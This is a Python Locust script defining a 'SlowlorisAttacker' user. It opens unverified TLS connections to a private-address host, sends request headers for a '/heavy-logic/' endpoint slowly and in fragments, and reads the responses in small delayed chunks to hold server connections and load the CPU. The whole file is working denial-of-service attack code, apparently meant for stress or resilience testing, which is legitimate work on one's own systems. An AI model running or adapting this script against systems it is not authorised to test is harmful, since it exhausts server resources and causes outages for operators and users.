import ssl
import time
import gevent
import gevent.socket as socket
from locust import User, constant, task


class SlowlorisAttacker(User):
    # ปรับ wait_time ให้สั้นลงเพื่อให้เริ่ม task ใหม่ได้เร็วขึ้น
    wait_time = constant(0.05)

    def _create_connection(self, target_host, target_port):
        """Create a TLS connection to the target."""
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(10)
        context = ssl._create_unverified_context()
        sock = context.wrap_socket(raw_sock, server_hostname=target_host)
        sock.connect((target_host, target_port))
        return sock

    @task
    def slow_loris_with_cpu(self):
        target_host = "10.0.24.35"
        target_port = 31984

        try:
            sock = self._create_connection(target_host, target_port)

            self.environment.events.request.fire(
                request_type="Slowloris",
                name="Connection_Established",
                response_time=1,
                response_length=0,
                exception=None,
            )

            for cycle in range(5):
                start_time = time.time()

                sock.send(f"GET /heavy-logic/ HTTP/1.1\r\n".encode("utf-8"))
                gevent.sleep(0.05)

                sock.send(f"Host: {target_host}:{target_port}\r\n".encode("utf-8"))
                gevent.sleep(0.05)

                sock.send(
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n".encode("utf-8")
                )
                gevent.sleep(0.05)

                sock.send("Connection: keep-alive\r\n".encode("utf-8"))
                gevent.sleep(0.05)

                sock.send("\r\n".encode("utf-8"))

                response_data = b""
                try:
                    while True:
                        chunk = sock.recv(128) 
                        if not chunk:
                            break
                        response_data += chunk
                        gevent.sleep(0.05)  
                        if b"\r\n\r\n" in response_data and len(response_data) > 500:
                            break
                except socket.timeout:
                    pass

                elapsed = (time.time() - start_time) * 1000
                self.environment.events.request.fire(
                    request_type="Slowloris",
                    name="Heavy_Request_Completed",
                    response_time=elapsed,
                    response_length=len(response_data),
                    exception=None,
                )

                gevent.sleep(0.1)

            sock.close()

        except Exception as e:
            self.environment.events.request.fire(
                request_type="Slowloris",
                name="Hold_Failed",
                response_time=0,
                response_length=0,
                exception=e,
            )